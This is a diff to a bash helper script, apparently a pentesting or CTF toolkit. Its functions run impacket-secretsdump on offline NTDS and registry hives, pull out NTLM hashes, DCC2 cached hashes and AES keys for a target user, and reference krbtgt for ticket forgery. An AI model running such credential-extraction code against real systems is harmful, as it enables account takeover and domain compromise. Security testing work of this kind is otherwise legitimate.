@@ -235,55 +235,6 @@ run_keepassxc_cli_command () {
     echo $kdbx_password | keepassxc-cli $1 $kdbx_file "$2"
 }
 
-get_ntlm_hashes_from_ntds() {
-
-    if [[ -z $target_username ]]; then
-        echo "No target username provided"
-        return 1
-    fi
-    local secrets_dump_options=""
-    if [[ -z $target_system ]]; then
-        target_system=system.hive
-        echo "No target SYSTEM provided, using default $target_system"
-    fi
-    if [[ ! -f "$target_system" ]]; then
-        echo "No target SYSTEM provided and default $target_system not found, cannot get hashes from secretsdump."
-        return 1
-    fi
-    secrets_dump_options+=" -system $target_system"
-    if [[ -z $target_ntds ]]; then
-        target_ntds=ntds.dit
-        echo "No target NTDS provided, using default $target_ntds"
-    fi
-    if [[ ! -f "$target_ntds" ]]; then
-        echo "No target NTDS provided and default $target_ntds not found, cannot get hashes from secretsdump."
-        return 1
-    fi
-    secrets_dump_options+=" -ntds $target_ntds"
-    if [[ -z "$dump_file_base" ]]; then
-        dump_file_base=hashes.secretsdump
-    fi
-    local dump_file="$dump_file_base.ntds"
-    echo "Using secrets dump file $dump_file"
-    if [[ ! -f "$dump_file" ]]; then
-        echo "Secrets dump file $dump_file not found, creating it..."
-        impacket-secretsdump $secrets_dump_options LOCAL -outputfile $dump_file_base
-    fi
-    if [[ -z "$target_domain" ]]; then
-        hash_file=$dump_file_base.$target_username
-    else
-        hash_file=$dump_file_base.$target_domain.$target_username
-    fi
-    ntlm_hash=$(cat "$dump_file" | grep $target_username | head -n 1 | awk -F':' '{print $4}')
-    if [[ -z $ntlm_hash ]]; then
-        echo "No NTLM hash found for $target_username"
-        return 1
-    fi
-    echo $ntlm_hash > $hash_file
-
-}
-
-
 get_cupp() {
     local url="https://raw.githubusercontent.com/Mebus/cupp/refs/heads/master/cupp.py"
     if [[ ! -f cupp.py ]]; then
@@ -348,10 +299,7 @@ create_password_list() {
 }
 
 get_ntlm_hashes_from_ntds() {
-    #if [[ -z $target_username ]]; then
-    #    echo "No target username provided"
-    #    return 1
-    #fi
+
     local secrets_dump_options=""
     if [[ -z $target_ntds ]]; then
         target_ntds=ntds.dit
@@ -389,6 +337,10 @@ get_ntlm_hashes_from_ntds() {
         impacket-secretsdump $secrets_dump_options LOCAL -outputfile $dump_file_base
     fi
 
+    if [[ -z $target_username ]]; then
+        echo "No target username provided"
+        return 1
+    fi
     #replace the hashfile
     if [[ -z "$target_domain" ]]; then
         hash_file=$dump_file_base.$target_username
@@ -460,15 +412,31 @@ get_ntlm_hashes_from_sam_hives() {
 
 }
 
-get_ntlm_hash_from_secretsdump() {
-    if [[ -z $dump_file ]]; then
-        echo "No full dump file provided"
+get_generic_from_secretsdump() {
+    if [[ ! -z $1 ]]; then
+        target_secrettype="$1"
+    else
+        echo "No secret was provided"
         return 1
-    fi
+    fi   
     if [[ -z $target_username ]]; then
         echo "No target username provided"
         return 1
     fi
+    if [[ -z $dump_file ]]; then
+        echo "No full dump file provided. Assuming you ran run_impacket_secretsdump"
+        if [[ ! -z $hash_file ]]; then
+            dump_file=$hash_file.$target_secrettype
+            echo "Using $dump_file as secretsdump output file"
+        else
+            echo "No hash file base provided, cannot find secretsdump output."
+            return 1
+        fi
+    fi
+}
+
+get_ntlm_hash_from_secretsdump() {
+    get_generic_from_secretsdump "sam"
     ntlm_hash=$(cat "$dump_file" | grep $target_username | awk -F':' '{print $4}')
     if [[ -z $ntlm_hash ]]; then
         echo "No NTLM hash found for $target_username"
@@ -479,15 +447,19 @@ get_ntlm_hash_from_secretsdump() {
 
 }
 
+get_dcc2_hashes_from_secretsdump() {
+    get_generic_from_secretsdump "cached"
+    dcc2_hash=$(cat "$dump_file" | grep $target_username  | awk -F':' '{print $2}')
+    if [[ -z $dcc2_hash ]]; then
+        echo "No DCC2 hash found for $target_username"
+        return 1
+    fi
+    hash_file=$dump_file.$target_username
+    echo $dcc2_hash > $hash_file
+}
+
 get_aes_key_from_secretsdump() {
-    if [[ -z $dump_file ]]; then
-        echo "No full dump file provided"
-        return 1
-    fi
-    if [[ -z $target_username ]]; then
-        echo "No target username provided"
-        return 1
-    fi
+    get_generic_from_secretsdump "secrets"
     if [[ $target_username != "krbtgt" ]]; then
         echo "Warning: for ticket forgery, we normally use krbtgt user. You are using $target_username"
     fi
